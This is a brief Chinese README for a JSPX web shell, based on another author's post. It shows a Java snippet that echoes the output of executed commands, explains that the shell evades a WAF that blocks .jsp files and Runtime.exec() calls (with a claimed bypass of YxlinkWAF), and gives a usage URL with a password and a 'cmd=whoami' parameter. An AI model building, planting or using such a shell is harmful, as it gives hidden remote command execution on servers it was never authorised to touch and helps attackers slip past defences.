## 来源
参考了Sevck大佬的文章：https://www.cnblogs.com/sevck/p/7069251.html
前辈NB！！！
我干了啥呢？我只是加了输出（大佬的那个直接执行没输出）。。。

添加输出的部分：
```
InputStream in = pro.getInputStream();
BufferedReader br = new BufferedReader(new InputStreamReader(in));
String lineStr;
while ((lineStr = br.readLine()) != null) {
	out.print(lineStr);
    out.print("\n");
}
```
## 用途
jsp被waf拦截的情况下，有时候可以上jspx，但是waf同样会检测内容，像Runtime.getRuntime().exec()经常被杀，这里只能换种方式去执行cmd，亲测可以绕过YxlinkWAF，别的暂时没试。
后续可以加上参数加密什么的。

## 使用方法：
> http://xxx/xx.jspx?pwd=sevck&cmd=whoami

